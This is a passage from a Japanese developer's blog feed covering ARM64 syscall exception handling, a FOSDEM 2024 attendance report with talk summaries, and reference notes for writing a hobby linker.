&lt;p&gt;典型的な&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%E6%A1%BC%A5%B6%A1%BC%A5%E2%A1%BC%A5%C9&quot;&gt;ユーザーモード&lt;/a&gt;(EL0)から&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%AB%A1%BC%A5%CD%A5%EB&quot;&gt;カーネル&lt;/a&gt;モード(E1)の&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/SVC&quot;&gt;SVC&lt;/a&gt;命令直後は以下のように処理が進む。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/SVC&quot;&gt;SVC&lt;/a&gt;によって権限昇格。(EL0-&gt;EL1)

&lt;ul&gt;
&lt;li&gt;ESR_EL1(syndrome register)には&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/SVC&quot;&gt;SVC&lt;/a&gt;によって例外が起きたことを表す値が格納される&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;VBAR_EL1&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%EC%A5%B8%A5%B9%A5%BF&quot;&gt;レジスタ&lt;/a&gt;で指定された例外ベクタテーブルを参照する

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://elixir.bootlin.com/linux/v4.8/source/arch/arm64/kernel/entry.S#L264&quot;&gt;https://elixir.bootlin.com/linux/v4.8/source/arch/arm64/kernel/entry.S#L264&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;例外ベクタテーブルの固定オフセット(&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/IRQ&quot;&gt;IRQ&lt;/a&gt;とFIQで異なる)に置かれたアドレスを例外ハンドラとして呼び出す。

&lt;ul&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/linux&quot;&gt;linux&lt;/a&gt;: &lt;a href=&quot;https://elixir.bootlin.com/linux/v4.8/source/arch/arm64/kernel/entry.S#L462&quot;&gt;https://elixir.bootlin.com/linux/v4.8/source/arch/arm64/kernel/entry.S#L462&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;例外ハンドラ中のsyscall(&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/svc&quot;&gt;svc&lt;/a&gt;)ハンドラを呼び出す

&lt;ul&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/linux&quot;&gt;linux&lt;/a&gt;: &lt;a href=&quot;https://elixir.bootlin.com/linux/v6.8.1/source/arch/arm64/kernel/entry-common.c#L696&quot;&gt;https://elixir.bootlin.com/linux/v6.8.1/source/arch/arm64/kernel/entry-common.c#L696&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;h2 id=&quot;References&quot;&gt;References&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://armkeil.blob.core.windows.net/developer/Files/pdf/graphics-and-multimedia/ARMv8_InstructionSetOverview.pdf&quot;&gt;https://armkeil.blob.core.windows.net/developer/Files/pdf/graphics-and-multimedia/ARMv8_InstructionSetOverview.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://wiki.cdot.senecacollege.ca/wiki/AArch64_Register_and_Instruction_Quick_Start&quot;&gt;https://wiki.cdot.senecacollege.ca/wiki/AArch64_Register_and_Instruction_Quick_Start&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Arm A64 Instruction Set Architecture&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://zenn.dev/hidenori3/articles/c9053a76be641c&quot;&gt;https://zenn.dev/hidenori3/articles/c9053a76be641c&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;aapcs64: &lt;a href=&quot;https://github.com/ARM-software/abi-aa/blob/main/aapcs64/aapcs64.rst#the-base-procedure-call-standard&quot;&gt;https://github.com/ARM-software/abi-aa/blob/main/aapcs64/aapcs64.rst#the-base-procedure-call-standard&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;aaelf64: &lt;a href=&quot;https://github.com/ARM-software/abi-aa/releases/download/2023Q3/aaelf64.pdf&quot;&gt;https://github.com/ARM-software/abi-aa/releases/download/2023Q3/aaelf64.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/questions/76567156/how-does-arm-svc-instruction-works&quot;&gt;https://stackoverflow.com/questions/76567156/how-does-arm-svc-instruction-works&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://developer.arm.com/documentation/100933/0100/AArch64-exception-vector-table&quot;&gt;https://developer.arm.com/documentation/100933/0100/AArch64-exception-vector-table&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>          <pubDate>Sun, 24 Mar 2024 01:07:52 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/6801883189093024441</guid>
          
          <enclosure url="https://cdn.image.st-hatena.com/image/scale/908434c14e8780355349613027719690449c4331/backend=imagemagick;version=1;width=1300/https%3A%2F%2Fcdn-ak.f.st-hatena.com%2Fimages%2Ffotolife%2Ft%2Ftamaroning%2F20240323%2F20240323185819.png" type="image/png" length="0" />
        </item>
      
    
      
      
        <item>
          <title>ヨーロッパ最大のOSS会議に参加した</title>
          <link>https://tamaron.hatenablog.com/entry/2024/02/21/184824</link>          <description>&lt;h1 id=&quot;はじめに&quot;&gt;はじめに&lt;/h1&gt;

&lt;p&gt;2/2~2/3にかけてベルギーの&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%D6%A5%EA%A5%E5%A5%C3%A5%BB%A5%EB&quot;&gt;ブリュッセル&lt;/a&gt;自由大学で開催された&lt;a href=&quot;https://fosdem.org/2024/&quot;&gt;FOSDEM 2024&lt;/a&gt;に参加してきた。
現地参加のきっかけは、去年参加したGSoCで知り合った&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt;のメンテナの&lt;a href=&quot;https://github.com/tschwinge&quot;&gt;Thomas&lt;/a&gt;さんに発表しないかと言われ、プレゼンを聞くだけでなく発表もしてきた。&lt;/p&gt;

&lt;p&gt;自分の発表👇&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://fosdem.org/2024/schedule/event/fosdem-2024-2370-unicode-support-for-gcc-rust/&quot;&gt;FOSDEM 2024 - Unicode Support for GCC Rust&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;色んな人と会った&quot;&gt;色んな人と会った&lt;/h1&gt;

&lt;p&gt;1日目の夜に、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%D6%A5%EA%A5%E5%A5%C3%A5%BB%A5%EB&quot;&gt;ブリュッセル&lt;/a&gt;中心部のバーでGSoCの修了生が交流する場所があり、取り組んでいたプロジェクトや大学のことなどを話した。インド人が多く、僕以外のアジア出身者はみんなヨーロッパ留学中でみんな英語が流暢だった。&lt;/p&gt;

&lt;p&gt;2日目はGSoCでお世話になった&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt;のメンテナの方々や&lt;a href=&quot;https://github.com/CohenArthur&quot;&gt;メンター&lt;/a&gt;と会って話すことができた。また、僕と同じく&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt; devroomで発表した&lt;a href=&quot;https://twitter.com/rui314&quot;&gt;Rui Ueyama&lt;/a&gt;さんにも会うことができた。&lt;/p&gt;

&lt;h1 id=&quot;英語&quot;&gt;英語&lt;/h1&gt;

&lt;p&gt;GSoCがきっかけで英語を書いたり話したりする機会が増えたけど、発表はしたことがなかったので不安だった。質疑応答も含め意外となんとかなって良かった。他の人と話していて、聞き取れなくて聞き返すことが多かったので、もっとリスニングを上手くなりたい。&lt;/p&gt;

&lt;h1 id=&quot;会場&quot;&gt;会場&lt;/h1&gt;

&lt;p&gt;クッキーを売るキッチンカー:
&lt;span itemscope itemtype=&quot;http://schema.org/Photograph&quot;&gt;&lt;img src=&quot;https://cdn-ak.f.st-hatena.com/images/fotolife/t/tamaroning/20240221/20240221182000.jpg&quot; width=&quot;768&quot; height=&quot;1024&quot; loading=&quot;lazy&quot; title=&quot;&quot; class=&quot;hatena-fotolife&quot; itemprop=&quot;image&quot;&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;1日目の開会式の様子:
&lt;span itemscope itemtype=&quot;http://schema.org/Photograph&quot;&gt;&lt;img src=&quot;https://cdn-ak.f.st-hatena.com/images/fotolife/t/tamaroning/20240221/20240221181747.jpg&quot; width=&quot;1024&quot; height=&quot;768&quot; loading=&quot;lazy&quot; title=&quot;&quot; class=&quot;hatena-fotolife&quot; itemprop=&quot;image&quot;&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;講義室前の廊下は次のプレゼン待ちの人でいっぱい:
&lt;span itemscope itemtype=&quot;http://schema.org/Photograph&quot;&gt;&lt;img src=&quot;https://cdn-ak.f.st-hatena.com/images/fotolife/t/tamaroning/20240221/20240221182010.jpg&quot; width=&quot;768&quot; height=&quot;1024&quot; loading=&quot;lazy&quot; title=&quot;&quot; class=&quot;hatena-fotolife&quot; itemprop=&quot;image&quot;&gt;&lt;/span&gt;
Rust devroomの様子:
&lt;span itemscope itemtype=&quot;http://schema.org/Photograph&quot;&gt;&lt;img src=&quot;https://cdn-ak.f.st-hatena.com/images/fotolife/t/tamaroning/20240221/20240221182006.jpg&quot; width=&quot;768&quot; height=&quot;1024&quot; loading=&quot;lazy&quot; title=&quot;&quot; class=&quot;hatena-fotolife&quot; itemprop=&quot;image&quot;&gt;&lt;/span&gt;&lt;/p&gt;

&lt;h1 id=&quot;聞いた発表&quot;&gt;聞いた発表&lt;/h1&gt;

&lt;p&gt;好きな低レイヤ関連の発表が多くて面白かった。&lt;/p&gt;

&lt;h3 id=&quot;Using-your-Laptop-TPM-as-a-Secure-Key-Store-Are-we-there-yet&quot;&gt;Using your Laptop &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/TPM&quot;&gt;TPM&lt;/a&gt; as a Secure Key Store: Are we there yet?&lt;/h3&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Intel&quot;&gt;Intel&lt;/a&gt;のエンジニアの方の発表。&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Linux&quot;&gt;Linux&lt;/a&gt;上ではcreate_tpm2_keyで&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/TPM&quot;&gt;TPM&lt;/a&gt;に&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/SSH&quot;&gt;SSH&lt;/a&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%C8%EB%CC%A9%B8%B0&quot;&gt;秘密鍵&lt;/a&gt;などの色んな鍵を保存することができる。ブート時の&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/TPM&quot;&gt;TPM&lt;/a&gt;の初期化(乱数生成)や実装の説明、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/TPM&quot;&gt;TPM&lt;/a&gt;に対する攻撃の話もあり面白かった。&lt;/p&gt;

&lt;h3 id=&quot;elfconv-AOT-compiler-that-translates-LinuxAArch64-ELF-binary-to-LLVM-bitcode-targeting-WebAssembly&quot;&gt;elfconv: AOT compiler that translates &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Linux&quot;&gt;Linux&lt;/a&gt;/AArch64 ELF binary to &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/LLVM&quot;&gt;LLVM&lt;/a&gt; bitcode targeting WebAssembly&lt;/h3&gt;

&lt;p&gt;ELFの実行ファイルをwasmに変換して、ブラウザ上で実行できるようにするツール。remillというツールで&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/x86-64&quot;&gt;x86-64&lt;/a&gt;→&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/LLVM&quot;&gt;LLVM&lt;/a&gt; IRに変換してからwasmに&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB&quot;&gt;コンパイル&lt;/a&gt;するという仕組み。&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B7%A5%B9%A5%C6%A5%E0%A5%B3%A1%BC%A5%EB&quot;&gt;システムコール&lt;/a&gt;やjmp命令で工夫が必要だそう。1&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%B5%A1%B3%A3%B8%EC&quot;&gt;機械語&lt;/a&gt;が&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/LLVM&quot;&gt;LLVM&lt;/a&gt; IRの1BBに変換されるため、トランスパイルに時間が結構掛かりそう。移植性という点では良いと思った。&lt;/p&gt;

&lt;h3 id=&quot;The-plan-for-gccrs&quot;&gt;The plan for gccrs&lt;/h3&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt;のRustフロントエンドの今後の開発についての話。rustcと異なり、borrow checkはHIRを変換したBIR上で行い、Tree &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/codegen&quot;&gt;codegen&lt;/a&gt;はHIRで行うことになったそう。標準ライブラリstd 1.49を目標にしており、そのためにはrustcのunstableな機能や、format_argsを実装する必要がある。よく知らないが、format_argsはトレイト解決の観点でかなり実装が大変らしい。&lt;/p&gt;

&lt;h3 id=&quot;WASM-101-porting-a-Sega-Game-Gear-emulator-to-the-browser&quot;&gt;WASM 101: porting a &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Sega&quot;&gt;Sega&lt;/a&gt; &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Game%20Gear&quot;&gt;Game Gear&lt;/a&gt; emulator to the browser&lt;/h3&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/SEGA&quot;&gt;SEGA&lt;/a&gt;のゲーム機(アーケード用?)の&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A8%A5%DF%A5%E5%A5%EC%A1%BC%A5%BF&quot;&gt;エミュレータ&lt;/a&gt;をRustで開発して、その後、ブラウザ用にポートしたという話。オーディオやグラフィックのクレートの紹介や、cfgを使ってターゲットにコードを切り替えるテクニックなど。&lt;/p&gt;

&lt;h3 id=&quot;Embedding-Servo-in-Rust-projects&quot;&gt;Embedding Servo in Rust projects&lt;/h3&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Mozilla&quot;&gt;Mozilla&lt;/a&gt;が開発していたブラウザServoの今後の話。&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Mozilla&quot;&gt;Mozilla&lt;/a&gt;の大規模&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%EC%A5%A4%A5%AA%A5%D5&quot;&gt;レイオフ&lt;/a&gt;の影響で今は別の企業がエンジニアを雇って開発しているとのこと。CSS3のサポートやミニブラウザのデモを通じてEmbedding &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/API&quot;&gt;API&lt;/a&gt;の紹介があった。&lt;/p&gt;

&lt;h3 id=&quot;Standardizing-the-generation-and-signing-of-boot-images&quot;&gt;Standardizing the generation and signing of boot images&lt;/h3&gt;

&lt;p&gt;ブートプロセスの標準化の話。U-bootを使った現代の&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Linux&quot;&gt;Linux&lt;/a&gt;のブートの解説があったが、難しくて全然わからなかった...😇&lt;/p&gt;

&lt;h1 id=&quot;旅費&quot;&gt;旅費&lt;/h1&gt;

&lt;p&gt;FOSDEMの参加にかかった費用は全額the &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GNU&quot;&gt;GNU&lt;/a&gt; Toolchain Fundに支援していただいた。
羽田-ベルギー、ロンドン-羽田、ベルギーでのホテル代で、計27万円ほど。
(会議が終わってから、他の国を観光するために、帰りはロンドン発にしてよいという許可をもらった。)&lt;/p&gt;

&lt;h1 id=&quot;おわりに&quot;&gt;おわりに&lt;/h1&gt;

&lt;p&gt;初めてのカンファレンス参加で発表し、色んな人と出会うことができ、本当に良い機会になった。
日本では&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%AA%A1%BC%A5%D7%A5%F3%A5%BD%A1%BC%A5%B9&quot;&gt;オープンソース&lt;/a&gt;を仕事にする人はとても少ないため、貴重な話を聞けたり、人脈も広がったりして良かった。今後、継続的に&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt;にコントリビュートするかはわからないけど、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/OSS&quot;&gt;OSS&lt;/a&gt;には貢献していって、またこのようなカンファレンスに参加したいと思った。&lt;/p&gt;

&lt;h2 id=&quot;旅の写真&quot;&gt;旅の写真&lt;/h2&gt;

&lt;p&gt;ロンドン、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%C8%A5%E9%A5%D5%A5%A1%A5%EB%A5%AC%A1%BC%B9%AD%BE%EC&quot;&gt;トラファルガー広場&lt;/a&gt;での&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%BD%D5%C0%E1&quot;&gt;春節&lt;/a&gt;:
&lt;span itemscope itemtype=&quot;http://schema.org/Photograph&quot;&gt;&lt;img src=&quot;https://cdn-ak.f.st-hatena.com/images/fotolife/t/tamaroning/20240221/20240221182148.jpg&quot; width=&quot;768&quot; height=&quot;1024&quot; loading=&quot;lazy&quot; title=&quot;&quot; class=&quot;hatena-fotolife&quot; itemprop=&quot;image&quot;&gt;&lt;/span&gt;
&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A2%A5%E0%A5%B9%A5%C6%A5%EB%A5%C0%A5%E0&quot;&gt;アムステルダム&lt;/a&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%B9%F1%CE%A9%C8%FE%BD%D1%B4%DB&quot;&gt;国立美術館&lt;/a&gt;:
&lt;span itemscope itemtype=&quot;http://schema.org/Photograph&quot;&gt;&lt;img src=&quot;https://cdn-ak.f.st-hatena.com/images/fotolife/t/tamaroning/20240221/20240221182137.jpg&quot; width=&quot;1024&quot; height=&quot;768&quot; loading=&quot;lazy&quot; title=&quot;&quot; class=&quot;hatena-fotolife&quot; itemprop=&quot;image&quot;&gt;&lt;/span&gt;
アンネフランクの隠れ家:
&lt;span itemscope itemtype=&quot;http://schema.org/Photograph&quot;&gt;&lt;img src=&quot;https://cdn-ak.f.st-hatena.com/images/fotolife/t/tamaroning/20240221/20240221182144.jpg&quot; width=&quot;768&quot; height=&quot;1024&quot; loading=&quot;lazy&quot; title=&quot;&quot; class=&quot;hatena-fotolife&quot; itemprop=&quot;image&quot;&gt;&lt;/span&gt;
ベルリンのビール美味しかったな:
&lt;span itemscope itemtype=&quot;http://schema.org/Photograph&quot;&gt;&lt;img src=&quot;https://cdn-ak.f.st-hatena.com/images/fotolife/t/tamaroning/20240221/20240221182141.jpg&quot; width=&quot;768&quot; height=&quot;1024&quot; loading=&quot;lazy&quot; title=&quot;&quot; class=&quot;hatena-fotolife&quot; itemprop=&quot;image&quot;&gt;&lt;/span&gt;&lt;/p&gt;
</description>          <pubDate>Wed, 21 Feb 2024 18:48:24 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/6801883189084997053</guid>
          
          <enclosure url="https://cdn.image.st-hatena.com/image/scale/ebf4e2d73fa7b7fcfca8fade7cf0cc4fda7cd518/backend=imagemagick;version=1;width=1300/https%3A%2F%2Fcdn-ak.f.st-hatena.com%2Fimages%2Ffotolife%2Ft%2Ftamaroning%2F20240221%2F20240221181747.jpg" type="image/jpeg" length="0" />
        </item>
      
    
      
      
        <item>
          <title>リンカ自作メモ</title>
          <link>https://tamaron.hatenablog.com/entry/2024/01/09/191310</link>          <description>&lt;h1 id=&quot;はじめに&quot;&gt;はじめに&lt;/h1&gt;

&lt;p&gt;二年前に&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/C%2B%2B&quot;&gt;C++&lt;/a&gt;の勉強のついでに作った簡単な静的オブジェクトのリンカを書いた。&lt;/p&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2Ftamaroning%2Fmyld&quot; title=&quot;GitHub - tamaroning/myld: [WIP] A toy linker for x86-64 ELF&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://github.com/tamaroning/myld&quot;&gt;github.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;今度はRustで書き直している。最初の目標はlibc.soを動的or静的リンクして、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Hello%20world&quot;&gt;Hello world&lt;/a&gt;を動かすこと。&lt;/p&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2Ftamaroning%2Fbold&quot; title=&quot;GitHub - tamaroning/bold&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://github.com/tamaroning/bold&quot;&gt;github.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;現時点での参考文献を挙げる。&lt;/p&gt;

&lt;h2 id=&quot;mold&quot;&gt;mold&lt;/h2&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2Frui314%2Fmold&quot; title=&quot;GitHub - rui314/mold: Mold: A Modern Linker 🦠&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://github.com/rui314/mold&quot;&gt;github.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;Rui Ueyamaさんの作っているとにかく速いリンカ。
自分は2021年あたりのコミットにcheckoutして読んでいる。&lt;/p&gt;

&lt;p&gt;moldの優れた点は&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;コードがわかりやすい&lt;/li&gt;
&lt;li&gt;小さなコードでマルチアーキ対応をしている&lt;/li&gt;
&lt;li&gt;できるだけ多くの箇所で並列化している&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;例えば、ELFヘッダ、セクションヘッダ、.textセクションなど異なる構造を&lt;code&gt;Chunk&lt;/code&gt;というクラスで上手く操作・管理している。初めてリンカをつくったときは、ヘッダやセクションの管理に苦労したため参考になった。&lt;/p&gt;

&lt;p&gt;ただ、生ポインタの循環参照が多くunsafeなしのRustで同じことをやろうとすると、かえって複雑になる。Rustには循環参のためのポインタ型&lt;code&gt;Weak&amp;lt;T&amp;gt;&lt;/code&gt;が用意されているが、これを使わずに、&lt;code&gt;HashMap&amp;lt;Item, ItemId&amp;gt;&lt;/code&gt;のようなプールを作り、&lt;code&gt;ItemId&lt;/code&gt;を参照代わりに使うほうが良いと思う。&lt;/p&gt;

&lt;p&gt;moldではリンカの各ステージで、&lt;code&gt;tbb::parallel_for_each&lt;/code&gt;を呼び出す構造になっており、クラスの同じフィールドに対して、読み出しと書き込みが同時に発生しないように注意して作られている。Rustではthread safetyが厳しく検査されるため、これを実現するには、構造体の各フィールドを&lt;code&gt;Mutex&lt;/code&gt;でラップするだけでは不十分で、スピンロックを使う必要がある。&lt;/p&gt;

&lt;h2 id=&quot;lld&quot;&gt;lld&lt;/h2&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2Fllvm%2Fllvm-project&quot; title=&quot;GitHub - llvm/llvm-project: The LLVM Project is a collection of modular and reusable compiler and toolchain technologies.&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://github.com/llvm/llvm-project&quot;&gt;github.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/LLVM&quot;&gt;LLVM&lt;/a&gt;ツールチェインのリンカ。
初めてリンカを書いたときに参考にした。&lt;/p&gt;

&lt;h2 id=&quot;Tool-Interface-Standard-TIS-Executable-and-Linking-Format-ELF&quot;&gt;Tool Interface Standard (TIS) Executable and Linking Format (ELF)&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://refspecs.linuxfoundation.org/elf/elf.pdf&quot;&gt;https://refspecs.linuxfoundation.org/elf/elf.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ELFの仕様書。情報が多いが、実装したい箇所の情報を取り出すのが難しい。というのもELFはリンカが使わない情報(ローダー、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%C7%A5%D0%A5%C3%A5%B0&quot;&gt;デバッグ&lt;/a&gt;情報)を含むからだ。
構造体のフィールドの意味を知りたいときに、辞書的に使うと良いと思う。&lt;/p&gt;

&lt;h2 id=&quot;readelf-binutils&quot;&gt;readelf (&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/binutils&quot;&gt;binutils&lt;/a&gt;)&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://sourceware.org/binutils/docs/binutils/readelf.html&quot;&gt;readelf (GNU Binary Utilities)&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;リンカ自作の初期は、readelfに認識されるようなファイルを出力することが目標になる。
アラインメントがずれていたり、不正な値が入っているときは、警告を出してくれる。objdumpよりもよく使う。&lt;/p&gt;

&lt;h2 id=&quot;Linkers-and-Loaders&quot;&gt;Linkers and Loaders&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.amazon.co.jp/-/en/JohnR-Levine/dp/4274064379&quot;&gt;https://www.amazon.co.jp/-/en/JohnR-Levine/dp/4274064379&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;20年以上前(2001年)の本なので古い。リンカについて知らない人が最初に読むにはいいかもしれない。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;まだ読んでないものとしては以下の通り。&lt;/p&gt;

&lt;h2 id=&quot;Linkers-ブログシリーズ-Airs--Ian-Lance-Taylor&quot;&gt;Linkers ブログシリーズ, Airs – Ian Lance Taylor&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.airs.com/blog/archives/38&quot;&gt;Airs &amp;ndash; Ian Lance Taylor &amp;raquo; Linkers part 1&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;goldの作者のブログ。&lt;/p&gt;

&lt;h2 id=&quot;リンカローダ実践開発テクニック&quot;&gt;リンカ・ローダ実践開発テクニック&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://shop.cqpub.co.jp/hanbai/books/38/38071.html&quot;&gt;&amp;#x30EA;&amp;#x30F3;&amp;#x30AB;&amp;#x30FB;&amp;#x30ED;&amp;#x30FC;&amp;#x30C0;&amp;#x5B9F;&amp;#x8DF5;&amp;#x958B;&amp;#x767A;&amp;#x30C6;&amp;#x30AF;&amp;#x30CB;&amp;#x30C3;&amp;#x30AF;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;数少ないリンカの和書の一つ。読んだことない。&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;既存のリンカ&quot;&gt;既存のリンカ&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GNU&quot;&gt;GNU&lt;/a&gt; ld&lt;/li&gt;
&lt;li&gt;gold&lt;/li&gt;
